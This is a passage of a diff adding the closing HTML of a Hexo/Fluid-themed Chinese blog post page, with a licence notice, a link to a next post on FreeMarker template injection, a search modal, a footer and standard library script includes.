+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/01/FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">FreeMarker模板注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
